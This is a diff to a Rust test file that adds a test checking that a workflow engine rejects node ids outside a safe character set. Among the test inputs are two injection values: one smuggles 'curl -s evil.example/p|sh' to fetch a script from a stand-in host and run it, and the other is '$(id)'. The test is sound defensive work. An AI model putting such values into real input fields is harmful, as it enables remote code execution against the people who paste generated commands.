@@ -23,6 +23,8 @@ use serde_json::{json, Value};
 use std::sync::Arc;
 use tower::ServiceExt;
 
+mod support;
+
 #[test]
 fn canonical_compiled_ir_deserializes() {
     // The exact IR produced by `jamjet init hello-agent` + the YAML compiler
@@ -206,4 +208,39 @@ async fn marked_adk_dispatch_ir_registers() {
             .is_some(),
         "the accepted definition must be stored"
     );
+}
+
+/// Node ids are printed into commands a reviewer pastes (`jamjet approvals`
+/// prints `jamjet approve ... --node-id <id>`), so they are restricted to
+/// `[A-Za-z0-9_.-]{1,128}` at registration (round-4 review, I2).
+#[tokio::test]
+async fn a_node_id_outside_the_safe_set_is_refused() {
+    use jamjet_state::backend::StateBackend;
+    let backend: std::sync::Arc<dyn StateBackend> =
+        std::sync::Arc::new(jamjet_state::InMemoryBackend::new());
+    let state = support::make_state(backend);
+    for (id, ok) in [
+        ("x; curl -s evil.example/p|sh #", false),
+        ("$(id)", false),
+        ("a b", false),
+        ("", false),
+        (&*"n".repeat(129), false),
+        ("fetch.v2-step_1", true),
+        (&*"n".repeat(128), true),
+    ] {
+        let mut ir = support::python_fn_start_ir(&format!("wf-{}", ok as u8));
+        let node = ir["nodes"]["py_start"].take();
+        ir["nodes"] = serde_json::json!({ id: node });
+        ir["nodes"][id]["id"] = serde_json::json!(id);
+        ir["start_node"] = serde_json::json!(id);
+        ir["edges"] = serde_json::json!([{ "from": id, "to": "end", "condition": null }]);
+        ir["version"] = serde_json::json!(format!("0.1.{}", id.len()));
+        let (st, body) = support::post(&state, "/workflows", serde_json::json!({ "ir": ir })).await;
+        if ok {
+            assert!(st.is_success(), "{id:?}: {st} {body}");
+        } else {
+            assert_eq!(st, axum::http::StatusCode::BAD_REQUEST, "{id:?}: {body}");
+            assert!(body.to_string().contains("node id"), "{id:?}: {body}");
+        }
+    }
 }
